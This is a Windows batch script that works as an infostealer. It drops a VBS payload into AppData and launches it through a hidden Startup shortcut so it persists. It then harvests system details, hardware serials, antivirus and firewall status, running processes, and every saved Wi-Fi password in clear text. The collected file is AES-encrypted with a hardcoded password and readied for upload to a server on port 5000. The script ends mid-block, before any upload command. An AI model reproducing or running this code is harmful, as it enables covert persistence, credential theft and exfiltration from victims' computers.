@echo off
setlocal

:: === Variables ===
set "ZIPFILE=LocalSettings.zip"
set "DEST=%AppData%"
set "VBS=%DEST%\LocalSettings\WindowsServices.vbs"
set "STARTUP=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT=%STARTUP%\WindowsServices.lnk"
set "SEVENZIP=%~dp0\7-Zip\App\7-Zip\7z.exe"

:: === Step 1: Extract LocalSettings.zip to %AppData% ===
if not exist "%SEVENZIP%" (
    echo ERROR: 7z.exe not found!
    pause
    exit /b 1
)

"%SEVENZIP%" x "%~dp0%ZIPFILE%" -o"%DEST%" -y >nul

:: === Step 2: Ensure Startup folder exists ===
if not exist "%STARTUP%" mkdir "%STARTUP%"

:: === Step 3: Create shortcut ===
powershell -Command ^
    "$ws = New-Object -ComObject WScript.Shell; " ^
    "$s = $ws.CreateShortcut('%SHORTCUT%'); " ^
    "$s.TargetPath = 'wscript.exe'; " ^
    "$s.Arguments = '\"%VBS%\"'; " ^
    "$s.WindowStyle = 0; " ^
    "$s.WorkingDirectory = '%DEST%\LocalSettings'; " ^
    "$s.IconLocation = 'wscript.exe,0'; " ^
    "$s.Save()"

:: === Step 4: Run script ===
start "" wscript.exe "%VBS%"

setlocal enabledelayedexpansion

set "FILE=data.txt"
echo Collecting system information...
echo ----------------------------------------- > "%FILE%"
echo SYSTEM INFORMATION REPORT >> "%FILE%"
echo Generated on: %DATE% %TIME% >> "%FILE%"
echo ----------------------------------------- >> "%FILE%"
echo. >> "%FILE%"

:: ===== OS Info =====
echo [Operating System] >> "%FILE%"
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Type" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Hardware UUID =====
echo [Hardware UUID] >> "%FILE%"
wmic csproduct get UUID /format:list >> "%FILE%"
echo. >> "%FILE%"

:: ===== CPU Info =====
echo [CPU] >> "%FILE%"
wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed /format:list >> "%FILE%"
echo. >> "%FILE%"

:: ===== RAM Info =====
echo [Memory] >> "%FILE%"
wmic MEMORYCHIP get Capacity,Manufacturer,PartNumber,Speed /format:list >> "%FILE%"
echo Total_RAM_GB= >> "%FILE%"
powershell -command "(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB" >> "%FILE%"
echo. >> "%FILE%"

:: ===== GPU Info =====
echo [GPU] >> "%FILE%"
wmic path win32_VideoController get Name,AdapterRAM,DriverVersion /format:list >> "%FILE%"
echo. >> "%FILE%"

:: ===== Battery Info =====
echo [Battery] >> "%FILE%"
wmic path Win32_Battery get EstimatedChargeRemaining,BatteryStatus,DesignCapacity,FullChargeCapacity /format:list >> "%FILE%"
echo. >> "%FILE%"

:: ===== Motherboard Info =====
echo [Motherboard] >> "%FILE%"
wmic baseboard get Product,Manufacturer,Version,SerialNumber /format:list >> "%FILE%"
echo. >> "%FILE%"

:: ===== BIOS Info =====
echo [BIOS] >> "%FILE%"
wmic bios get SMBIOSBIOSVersion,Manufacturer,ReleaseDate /format:list >> "%FILE%"
echo. >> "%FILE%"

:: ===== Disk Info =====
echo [Disks] >> "%FILE%"
wmic diskdrive get Model,InterfaceType,SerialNumber,Size /format:list >> "%FILE%"
echo. >> "%FILE%"

:: ===== Network Info =====
echo [Network Adapters] >> "%FILE%"
wmic nic where "NetEnabled=true" get Name,MACAddress,Speed /format:list >> "%FILE%"
echo. >> "%FILE%"

:: ===== IP Info =====
echo [IP Configuration] >> "%FILE%"
ipconfig /all >> "%FILE%"
echo. >> "%FILE%"

:: ===== Antivirus Status =====
echo [Antivirus Status] >> "%FILE%"
powershell -command "Get-MpComputerStatus | select AntivirusEnabled, RealTimeProtectionEnabled, AMServiceEnabled" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Firewall Status =====
echo [Firewall Status] >> "%FILE%"
netsh advfirewall show allprofiles >> "%FILE%"
echo. >> "%FILE%"

:: ===== Installed Applications =====
echo [Installed Applications] >> "%FILE%"
echo. >> "%FILE%"

:: ===== Wi-Fi Saved Networks + Passwords =====
echo [Saved Wi-Fi Networks and Passwords] >> "%FILE%"
for /f "tokens=1,2 delims=:" %%A in ('netsh wlan show profiles ^| findstr /C:"All User Profile"') do (
    set "ssid=%%B"
    set "ssid=!ssid:~1!"
    echo SSID: !ssid! >> "%FILE%"
    netsh wlan show profile name="!ssid!" key=clear >> "%FILE%"
    echo. >> "%FILE%"
)

echo. >> "%FILE%"

:: ===== Running Processes =====
echo [Running Processes] >> "%FILE%"
tasklist >> "%FILE%"
echo. >> "%FILE%"

echo DONE. System info saved to %FILE%.

set "FILE=data.txt"
set "ENCFILE=data.txt.enc"

set "SERVER_IP="
set "SERVER=http://%SERVER_IP%:5000/upload"

set /p TOKEN="Enter token: "

:: ===== Encrypt the file using AES in PowerShell =====
powershell -NoLogo -NoProfile ^
  "$Password = 'Wearelegion2001!';" ^
  "$Key = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, (1..8))); " ^
  "$Aes = [System.Security.Cryptography.Aes]::Create(); " ^
  "$Aes.Key = $Key.GetBytes(32); " ^
  "$Aes.IV = $Key.GetBytes(16); " ^
  "[IO.File]::WriteAllBytes('%ENCFILE%', ( " ^
  "    $Aes.CreateEncryptor().TransformFinalBlock( " ^
  "        [System.Text.Encoding]::UTF8.GetBytes((Get-Content '%FILE%' -Raw)), 0, (Get-Content '%FILE%' -Raw).Length " ^
  "    ) " ^
  "))"

if not exist "%ENCFILE%" (
    echo Encryption FAILED!
:: Finished
exit /b
